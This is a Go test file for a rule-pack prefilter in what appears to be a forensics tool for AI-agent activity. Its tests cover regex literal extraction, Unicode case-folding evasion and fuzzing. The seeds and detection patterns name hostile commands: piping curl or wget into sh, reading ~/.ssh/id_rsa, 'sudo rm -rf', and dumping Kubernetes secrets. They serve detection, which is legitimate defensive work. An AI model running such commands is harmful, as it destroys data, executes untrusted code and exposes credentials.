package rulepack

import (
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"sort"
	"testing"

	"github.com/efij/AgentDFIR/v3/internal/overlay"
	"github.com/efij/AgentDFIR/v3/internal/schema"
)

func TestRequiredLiterals(t *testing.T) {
	for _, tc := range []struct {
		re   string
		want []string // nil: no prefilter may be derived
	}{
		{`curl\s+http`, []string{"CURL"}},
		{`(?i)base64\s+-d`, []string{"BASE64"}},
		{`(curl|wget)\s+\S+\s*\|\s*(ba)?sh`, []string{"CURL", "WGET"}},
		{`\.ssh/id_[a-z]+`, []string{".SSH/ID_"}},
		{`(?:foo)?bar`, []string{"BAR"}},
		{`(?:foo)?(?:bar)?`, nil},              // nothing is mandatory
		{`[a-z]+@[a-z]+`, []string{"@"}[:0:0]}, // one-rune literal: not worth it
		{`a|[0-9]+`, nil},                      // an alternative with no literal
		{`x*`, nil},
		{`(?:ab){2,}`, []string{"AB"}},
	} {
		got := requiredLiterals(tc.re)
		if len(tc.want) == 0 {
			if got != nil {
				t.Errorf("%q: got prefilter %q, want none", tc.re, got)
			}
			continue
		}
		sort.Strings(got)
		sort.Strings(tc.want)
		if !reflect.DeepEqual(got, tc.want) {
			t.Errorf("%q: got %q, want %q", tc.re, got, tc.want)
		}
	}
}

// Case-insensitive matching in Go folds whole Unicode orbits: the long s
// matches "s" and the Kelvin sign matches "k". A prefilter that only
// lowercased would skip these and miss a match an attacker can craft.
func TestPrefilterFoldsLikeRegexp(t *testing.T) {
	for _, tc := range []struct{ re, subject string }{
		{`(?i)secret`, "ſecret"},
		{`(?i)kubectl`, "Kubectl"},
		{`(?i)SSH`, "ſſh"},
		{`(?i)ÅNGSTRÖM`, "Ångström"}, // Angstrom sign
	} {
		re := regexp.MustCompile(tc.re)
		if !re.MatchString(tc.subject) {
			t.Fatalf("setup: %q does not match %q", tc.re, tc.subject)
		}
		need := requiredLiterals(tc.re)
		if need == nil {
			t.Fatalf("%q: no prefilter derived", tc.re)
		}
		if !mayMatch(need, fold(tc.subject)) {
			t.Errorf("%q matches %q but the prefilter would skip it", tc.re, tc.subject)
		}
	}
}

// The prefilter may only ever let more through than the regex matches.
func FuzzPrefilterNeverSkipsAMatch(f *testing.F) {
	packs, _, err := Embedded()
	if err != nil {
		f.Fatal(err)
	}
	var rules []*Rule
	for _, p := range packs {
		for i := range p.Rules {
			if p.Rules[i].re != nil && p.Rules[i].need != nil {
				rules = append(rules, &p.Rules[i])
			}
		}
	}
	for _, seed := range []string{"curl http://x | sh", "cat ~/.ssh/id_rsa", "ſudo rm -rf", "base64 -d <<< x", "Kubectl get secrets"} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, s string) {
		folded := fold(s)
		for _, r := range rules {
			if r.re.MatchString(s) && !mayMatch(r.need, folded) {
				t.Fatalf("rule %s matches %q but its prefilter %q skips it", r.ID, s, r.need)
			}
		}
	})
}

// Every shipped regex that gets a prefilter keeps matching what it
// matched: the embedded packs' rules are run with and without it over
// every event of a real case, when one is supplied.
//
//	AGENTDFIR_PREFILTER_CASE=/path/to/case.adfir go test -run RealCase ./internal/rulepack/
func TestPrefilterMatchesRealCase(t *testing.T) {
	pkg := os.Getenv("AGENTDFIR_PREFILTER_CASE")
	if pkg == "" {
		t.Skip("AGENTDFIR_PREFILTER_CASE not set")
	}
	events := overlay.ReadJSONL[schema.Event](filepath.Join(pkg, "normalized", "events.jsonl"))
	packs, _, err := Embedded()
	if err != nil {
		t.Fatal(err)
	}
	packs, _ = Dedupe(packs)
	with, err := Apply(packs, &schema.Normalized{Events: events}, pkg)
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range packs {
		for i := range p.Rules {
			p.Rules[i].need = nil
		}
	}
	without, err := Apply(packs, &schema.Normalized{Events: events}, pkg)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(with, without) {
		t.Fatalf("prefilter changed the findings: %d with, %d without", len(with), len(without))
	}
	t.Logf("%d events, %d findings, identical with and without the prefilter", len(events), len(with))
}
